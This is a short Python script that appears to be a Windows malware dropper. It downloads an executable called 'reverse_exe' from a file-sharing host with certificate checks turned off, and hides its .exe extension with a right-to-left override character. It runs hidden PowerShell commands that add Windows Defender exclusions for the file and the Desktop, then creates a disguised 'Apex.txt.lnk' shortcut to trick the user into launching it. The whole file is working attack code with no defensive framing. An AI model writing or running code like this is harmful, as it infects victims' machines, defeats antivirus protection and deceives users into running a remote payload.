import urllib.request
import subprocess
import os
import winshell
import ssl

ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

file_urls = [
    ("https://anonfiles.com/hdde4752z8/reverse_exe", "C:\\Ap\u202Etxt.exe")
]

for url, save_path in file_urls:
    with urllib.request.urlopen(url, context=ssl_context) as response:
        with open(save_path, 'wb') as f:
            f.write(response.read())

shortcut_path = os.path.expanduser("~\\Desktop")
icon_path = "C:\\Windows\\system32\\shell32.dll, 3"

powershell_cmds = [
    f'Add-MpPreference -ExclusionPath "{file_urls[0][1]}"',
    f'Add-MpPreference -ExclusionPath "{shortcut_path}"'
]

for cmd in powershell_cmds:
    result = subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True)
    print(result.stdout.decode('utf-8'))
    print(result.stderr.decode('utf-8'))

shortcut_name = "Apex.txt.lnk"
shortcut_path = os.path.join(winshell.desktop(), shortcut_name)

first_file_path = file_urls[0][1]

winshell.CreateShortcut(
    Path=shortcut_path,
    Target=first_file_path,
    Icon=(icon_path, 0)
)